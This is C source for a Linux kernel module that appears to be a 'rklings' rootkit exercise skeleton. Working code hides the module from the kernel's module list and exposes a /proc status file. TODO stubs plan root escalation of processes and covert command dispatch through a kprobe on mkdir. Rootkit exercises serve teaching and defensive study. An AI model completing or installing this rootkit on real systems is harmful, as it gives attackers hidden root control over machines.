// SPDX-License-Identifier: GPL-2.0
#include <linux/cred.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/kprobes.h>
#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/ptrace.h>
#include <linux/seq_file.h>
#include <linux/string.h>
#include <linux/uaccess.h>

#define RK_PREFIX "rklings."
#define RK_PREFIX_LEN 8
#define RK_PATH_MAX 128

static struct list_head *saved_prev;
static bool module_hidden;
static struct proc_dir_entry *proc_entry;

static void rk_module_hide(void)
{
	if (module_hidden)
		return;
	saved_prev = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);
	module_hidden = true;
}

static void rk_module_unhide(void)
{
	if (!module_hidden)
		return;
	list_add(&THIS_MODULE->list, saved_prev);
	module_hidden = false;
}

// TODO: rk_escalate (escalate current + parent)

// TODO: rk_parse_local_command(path) dispatch table:
//   "e"   -> rk_escalate()
//   "h.m" -> rk_module_hide()
//   "u.m" -> rk_module_unhide()

// TODO: rk_mkdir_pre(probe, regs) kprobe pre_handler

static struct kprobe mkdir_probe = {
	.symbol_name = "__x64_sys_mkdir",
	// TODO: set .pre_handler
};

static int rk_show(struct seq_file *out, void *unused)
{
	(void)unused;
	seq_printf(out, "module: %s\n", module_hidden ? "hidden" : "visible");
	return 0;
}

static int rk_proc_open(struct inode *inode, struct file *file)
{
	return single_open(file, rk_show, NULL);
}

static const struct proc_ops rk_proc_ops = {
	.proc_open = rk_proc_open,
	.proc_read = seq_read,
	.proc_lseek = seq_lseek,
	.proc_release = single_release,
};

// TODO: rk_init (register kprobe, create /proc/rkling_status)

// TODO: rk_exit (unhide, remove proc, unregister kprobe)

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Rklings local covert control");
